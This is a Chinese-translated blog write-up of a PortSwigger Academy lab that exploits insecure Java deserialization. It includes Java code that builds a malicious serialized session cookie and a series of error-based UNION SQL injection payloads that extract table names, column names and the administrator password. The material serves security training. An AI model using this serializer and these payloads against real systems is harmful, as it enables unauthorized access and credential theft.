<html>
<head>
<title>Insecure Deserialization — Web Challenges — Part 1</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">不安全的反序列化— Web挑战—第1部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/insecure-deserialization-web-challenges-part-1-7d1b7339ca?source=collection_archive---------0-----------------------#2021-06-08">https://infosecwriteups.com/insecure-deserialization-web-challenges-part-1-7d1b7339ca?source=collection_archive---------0-----------------------#2021-06-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="caa7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这篇文章是关于在swigger web academy上解决不安全反序列化领域的专家级挑战。我将分三个部分讨论这个问题，解决三个挑战。希望每个部分都小而简单。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/10a31fa7e6c60cca29eb3461f9943619.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*JbBmp4n9KPIQC0qS.jpg"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">图片来自斯韦格港网络学院</figcaption></figure><h1 id="f175" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">为Java反序列化开发定制小工具链</h1><h2 id="7da4" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">挑战</h2><p id="d7a8" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated"><a class="ae mq" href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization" rel="noopener ugc nofollow" target="_blank">https://portswigger . net/we B- security/deserialization/exploining/la B- deserialization-developing-a-custom-gadget-chain-for-Java-deserialization</a></p><h2 id="e1a2" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">解决办法</h2><h2 id="7fe8" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">第一步</h2><p id="59a3" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">一旦我们使用wiener:peter登录应用程序，就会生成一个会话cookie。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mr"><img src="../Images/00a38afd20ab7f618ade44f93aaaf16b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1pu1Jau9bfdYF71XECXe3g.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">登录发布请求</figcaption></figure><p id="229b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您查看会话cookie值，它以rO0开始，这清楚地表明cookie值是base64编码的java序列化对象。问题陈述中也提到了。(所以没什么大不了的:)</p><p id="6d83" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们解码会话cookie。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ms"><img src="../Images/9e69920681860ae8bd5828a07c116e46.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_InAGGwwUps59Kf7_eAijA.png"/></div></div></figure><p id="af09" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们能看到一些东西</p><ol class=""><li id="53e5" class="mt mu iq jp b jq jr ju jv jy mv kc mw kg mx kk my mz na nb bi translated">序列化的java类名— AccessTokenUser</li><li id="7655" class="mt mu iq jp b jq nc ju nd jy ne kc nf kg ng kk my mz na nb bi translated">类字段AccessToken、username及其值</li></ol><h2 id="4ffe" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">第二步</h2><p id="2ff8" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">现在，如果我们查看html页面的源代码，我们可以看到这段注释代码<code class="fe nh ni nj nk b">&lt;! — &lt;a href=/backup/AccessTokenUser.java&gt;Example user&lt;/a&gt; → </code>。我们在/backup端点找到两个java文件。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nl"><img src="../Images/c99cffe8824098ffd5c25c07027e758b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZM4jBK9WtmOEkCe0XG30EQ.png"/></div></div></figure><p id="3af6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">AccessTokenUsre.java是被序列化并在会话cookie中返回的类。请注意用户名和accessToken字段。</p><pre class="km kn ko kp gt nm nk nn no aw np bi"><span id="8606" class="lz lc iq nk b gy nq nr l ns nt">public class AccessTokenUser implements Serializable<br/>{<br/>    private final String username;<br/>    private final String accessToken;<br/><br/>    public AccessTokenUser(String username, String accessToken)<br/>    {<br/>        this.username = username;<br/>        this.accessToken = accessToken;<br/>    }<br/><br/>    public String getUsername()<br/>    {<br/>        return username;<br/>    }<br/><br/>    public String getAccessToken()<br/>    {<br/>        return accessToken;<br/>    }<br/>}</span></pre><p id="5202" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们看看ProductTemplate.java的源代码。<code class="fe nh ni nj nk b">ProductTemplate.readObject()</code>方法调用<code class="fe nh ni nj nk b">inputStream.defaultReadObject(); </code>反序列化序列化ProductTemplate对象时会调用readObject()方法。我们还可以看到一个构造函数初始化字段<code class="fe nh ni nj nk b">id</code>。</p><pre class="km kn ko kp gt nm nk nn no aw np bi"><span id="97c4" class="lz lc iq nk b gy nq nr l ns nt">private final String id;<br/>    private transient Product product;<br/><br/>    public ProductTemplate(String id)<br/>    {<br/>        this.id = id;<br/>    }<br/>private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException<br/>    {<br/>        inputStream.defaultReadObject();       </span></pre><p id="9ec5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有一点需要注意，有一个sql查询直接在查询中使用了这个<code class="fe nh ni nj nk b"> id</code>字段。这里清楚sql注入的情况。</p><pre class="km kn ko kp gt nm nk nn no aw np bi"><span id="db65" class="lz lc iq nk b gy nq nr l ns nt">Connection connect = connectionBuilder.connect(30);<br/>            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);<br/>            Statement statement = connect.createStatement();<br/>            ResultSet resultSet = statement.executeQuery(sql);<br/>            if (!resultSet.next())<br/>            {<br/>                return;<br/>            }<br/>            product = Product.from(resultSet);</span></pre><p id="f0a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们的利用步骤应该是</p><ol class=""><li id="536e" class="mt mu iq jp b jq jr ju jv jy mv kc mw kg mx kk my mz na nb bi translated">从前面获得的产品模板java文件创建一个序列化对象。将我们的有效负载放入id字段，然后对序列化对象进行base64编码</li><li id="43ca" class="mt mu iq jp b jq nc ju nd jy ne kc nf kg ng kk my mz na nb bi translated">在会话cookie中使用步骤1中的base64编码值。一旦这个值被反序列化(readObject()将被调用)，我们就可以使用id字段中的有效负载来利用sql注入。</li><li id="15af" class="mt mu iq jp b jq nc ju nd jy ne kc nf kg ng kk my mz na nb bi translated">将执行Sql查询，因为它在反序列化期间将调用的readObject()方法中</li><li id="353b" class="mt mu iq jp b jq nc ju nd jy ne kc nf kg ng kk my mz na nb bi translated"><strong class="jp ir">注意</strong><code class="fe nh ni nj nk b">private transient Product product</code>是瞬态的，所以这个字段不会被序列化。</li><li id="ec40" class="mt mu iq jp b jq nc ju nd jy ne kc nf kg ng kk my mz na nb bi translated">一旦我们利用sql注入提取管理员密码，我们就删除carlos帐户并解决实验室问题。</li></ol><h2 id="e963" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">第三步</h2><p id="914b" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated"><strong class="jp ir">创建序列化对象</strong></p><p id="548a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Port Swigger已经提供了示例java文件，可以用来创建序列化对象<a class="ae mq" href="https://github.com/PortSwigger/serialization-examples/tree/master/java/solution" rel="noopener ugc nofollow" target="_blank">https://github . com/ports Swigger/serialization-examples/tree/master/Java/solution</a>。复制本地文件夹中的文件并编译它们。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nu"><img src="../Images/a0bc55fe038cfdfc1c24cb5f8836db52.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jdHu_l6T_kqxRWEaxgd2ng.png"/></div></div></figure><p id="f86f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您查看产品模板java文件(用于创建serialize对象的文件)。重要的是设置id字段值的构造函数。</p><pre class="km kn ko kp gt nm nk nn no aw np bi"><span id="81a4" class="lz lc iq nk b gy nq nr l ns nt">// All logic removed from ProductTemplate as it's not needed for serialization<br/>package data.productcatalog;<br/>import java.io.Serializable;</span><span id="74f9" class="lz lc iq nk b gy nv nr l ns nt">public class ProductTemplate implements Serializable<br/>{<br/>    static final long serialVersionUID = 1L;</span><span id="b5b8" class="lz lc iq nk b gy nv nr l ns nt">private final String id;<br/>    private transient Product product;</span><span id="92ae" class="lz lc iq nk b gy nv nr l ns nt">public ProductTemplate(String id)<br/>    {<br/>        this.id = id;<br/>    }</span></pre><p id="53b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将从Main.java实例化ProductTemplate对象，调用有效负载在<code class="fe nh ni nj nk b"> id</code>字段值中的构造函数，序列化该对象并进行base64编码。这个base64编码的值可以在会话cookie中使用。</p><pre class="km kn ko kp gt nm nk nn no aw np bi"><span id="1199" class="lz lc iq nk b gy nq nr l ns nt">public static void main(String[] args) throws Exception {<br/>ProductTemplate originalObject = new ProductTemplate(args[0]); <strong class="nk ir">//</strong> <strong class="nk ir">Take command line argument and instantiate the Object</strong></span><span id="f3b8" class="lz lc iq nk b gy nv nr l ns nt">String serializedObject = serialize(originalObject); <strong class="nk ir">// serialize the object </strong></span><span id="7d64" class="lz lc iq nk b gy nv nr l ns nt">System.out.println("Serialized object: " + serializedObject);</span><span id="0a82" class="lz lc iq nk b gy nv nr l ns nt">ProductTemplate deserializedObject = deserialize(serializedObject); <strong class="nk ir">// this is not required. Just for testing purpose</strong></span><span id="de04" class="lz lc iq nk b gy nv nr l ns nt">    }</span><span id="34b9" class="lz lc iq nk b gy nv nr l ns nt">private static String serialize(Serializable obj) throws Exception {<br/>        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);<br/>        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {<br/>            out.writeObject(obj);<br/>        }<br/>        return Base64.getEncoder().encodeToString(baos.toByteArray()); <strong class="nk ir">// base64 encoding</strong><br/>    }</span></pre><p id="7d65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编译java类</p><pre class="km kn ko kp gt nm nk nn no aw np bi"><span id="7216" class="lz lc iq nk b gy nq nr l ns nt">javac  data/productcatalog/Product.java<br/>javac  data/productcatalog/ProductTemplate.java<br/>javac  Main.java</span></pre><p id="6013" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将创建一个id值为<code class="fe nh ni nj nk b">'</code>的序列化对象—单引号。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nw"><img src="../Images/493ea5901c1846a824ceab4509585563.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_f1YNuSpTi5CTBSjLFrfAw.png"/></div></div></figure><p id="e776" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将生成的base64值粘贴到会话cookie中，并观察响应中的错误。我们在响应中得到一个sql错误，指出postgres是数据库名称。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nx"><img src="../Images/e3eb21967a52e71a287130c4a9363944.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GX88egp6lyDVwg5fYzhidw.png"/></div></div></figure><h2 id="c67e" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">步骤4</h2><p id="dd5c" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated"><strong class="jp ir">利用sql注入</strong></p><p id="7b10" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我修改了Main.java，从类本身直接调用GET /my-account，以避免每次在cookie中复制粘贴burpsuite中的有效负载，同时我们尝试利用sql注入。修改过的Main.java文件。</p><pre class="km kn ko kp gt nm nk nn no aw np bi"><span id="ba94" class="lz lc iq nk b gy nq nr l ns nt">import data.productcatalog.ProductTemplate;<br/>import java.io.*;<br/>import java.util.Base64;<br/>import java.net.http.HttpClient;<br/>import java.net.http.HttpRequest;<br/>import java.net.http.HttpResponse;<br/>import java.net.URI;</span><span id="915d" class="lz lc iq nk b gy nv nr l ns nt">class Main {<br/>    public static void main(String[] args) throws Exception {<br/>        ProductTemplate originalObject = new ProductTemplate(args[0]);</span><span id="9d91" class="lz lc iq nk b gy nv nr l ns nt">String serializedObject = serialize(originalObject);</span><span id="63be" class="lz lc iq nk b gy nv nr l ns nt">System.out.println("Serialized object: " + serializedObject);</span><span id="6106" class="lz lc iq nk b gy nv nr l ns nt">ProductTemplate deserializedObject = deserialize(serializedObject);</span><span id="15a5" class="lz lc iq nk b gy nv nr l ns nt">System.out.println("Deserialized object ID: " + deserializedObject.getId());<br/>  <br/> <strong class="nk ir"> HttpClient client = HttpClient.newHttpClient();<br/>  <br/>  HttpRequest request = HttpRequest.newBuilder().uri(URI.create("</strong><a class="ae mq" href="https://acf01fdc1f53ee6a818f73cf0000005d.web-security-academy.net/my-account" rel="noopener ugc nofollow" target="_blank"><strong class="nk ir">https://acf01fdc1f53ee6a818f73cf0000005d.web-security-academy.net/my-account</strong></a><strong class="nk ir">")).headers("Cookie", "session="+serializedObject).build();<br/>    <br/>  HttpResponse&lt;String&gt; response = client.send(request, HttpResponse.BodyHandlers.ofString());<br/>  <br/>  System.out.println("\n Body: " + response.body());</strong><br/>    }</span><span id="fea8" class="lz lc iq nk b gy nv nr l ns nt">private static String serialize(Serializable obj) throws Exception {<br/>        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);<br/>        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {<br/>            out.writeObject(obj);<br/>        }<br/>        return Base64.getEncoder().encodeToString(baos.toByteArray());<br/>    }</span><span id="8cd3" class="lz lc iq nk b gy nv nr l ns nt">private static &lt;T&gt; T deserialize(String base64SerializedObj) throws Exception {<br/>        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {<br/>            <a class="ae mq" href="http://twitter.com/SuppressWarnings" rel="noopener ugc nofollow" target="_blank">@SuppressWarnings</a>("unchecked")<br/>            T obj = (T) in.readObject();<br/>            return obj;<br/>        }<br/>    }<br/>}</span></pre><p id="ce81" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在创建有效负载时，我们必须意识到，语法正确的查询不会反映响应中的细节，相反，我们会得到一个类强制转换异常。所以sql异常是第一个异常，类转换异常在下一个异常中。例如，当我们使用id作为123时，响应将是</p><pre class="km kn ko kp gt nm nk nn no aw np bi"><span id="1cc6" class="lz lc iq nk b gy nq nr l ns nt">&lt;p class=is-warning&gt;java.lang.ClassCastException: class data.productcatalog.ProductTemplate cannot be cast to class data.session.token.AccessTokenUser (data.productcatalog.ProductTemplate and data.session.token.AccessTokenUser are in unnamed module of loader &amp;apos;app&amp;apos;)&lt;/p&gt;</span></pre><p id="c9c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，如果我们的查询不正确，那么它将不会执行，我们将无法枚举数据库表和其中的数据。我们将在sql查询中把一个带有字符串值的列转换成一个整数，让它产生错误并把这个值(列值)反映在响应中。</p><p id="cc3e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">列数</strong></p><p id="e22f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是首先，我们将使用union query首先找出products表中的列数。使用union有效负载<code class="fe nh ni nj nk b">"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables --"</code>增加NULL的数量来查找列的数量，结果是8。</p><p id="1ff5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">查找表名</strong></p><p id="b2c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有效载荷— <code class="fe nh ni nj nk b">java Main "' UNION SELECT NULL,NULL,NULL,NULL,CAST(table_name AS numeric),null,null,null from information_schema.tables -- "</code></p><p id="5489" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">响应<code class="fe nh ni nj nk b">&lt;p class=is-warning&gt;org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &amp;quot;<strong class="jp ir">users</strong>&amp;quot;&lt;/p&gt; </code>中的错误将表名显示为用户</p><p id="a071" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">列名</strong></p><p id="51ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有效载荷1 — <code class="fe nh ni nj nk b">' UNION SELECT NULL,NULL,NULL,NULL,CAST(column_name AS numeric),null,null,null from information_schema.columns where table_name = 'users' --</code></p><p id="b90e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">响应1中的错误— <code class="fe nh ni nj nk b">&lt;p class=is-warning&gt;org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &amp;quot;<strong class="jp ir">username</strong>&amp;quot;&lt;/p&gt;</code></p><p id="6ed8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有效载荷2 — <code class="fe nh ni nj nk b"> 'UNION SELECT NULL,NULL,NULL,NULL,CAST(column_name AS numeric),null,null,null from information_schema.columns where table_name = 'users' and column_name !='username'--</code></p><p id="8f48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">响应2中的错误— <code class="fe nh ni nj nk b">&lt;p class=is-warning&gt;org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &amp;quot;<strong class="jp ir">password</strong>&amp;quot;&lt;/p&gt;</code></p><p id="8f39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道了表名和列名，我们可以提取用户administrator的密码。</p><p id="79fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">提取管理员密码</strong></p><p id="005e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有效载荷— <code class="fe nh ni nj nk b">'UNION SELECT NULL,NULL,NULL,NULL,CAST(password AS numeric),null,null,null from users where username='administrator' --</code></p><p id="fc3e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">响应错误— <code class="fe nh ni nj nk b">&lt;p class=is-warning&gt;org.apache.commons.lang3.SerializationException: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &amp;quot;<strong class="jp ir">qb4qfsrkyddqmyka0uz6</strong>&amp;quot;&lt;/p&gt;</code></p><p id="1932" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了管理员密码作为响应(这对于不同的实例是不同的)。</p><p id="eec9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们可以以管理员身份登录并删除carlos帐户来解决实验室问题。</p><p id="1574" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将尝试创建一个漏洞脚本来自动化密码检索部分，而不是尝试手动sql注入负载。</p><p id="4003" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">目前就这些。如果我犯了什么错误，请评论，你可以随时联系我<a class="ae mq" href="https://www.linkedin.com/in/niraj-kumar-choubey-7351b892/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/niraj-kumar-choubey-7351b892/</a>并向我问好。</p></div></div>    
</body>
</html>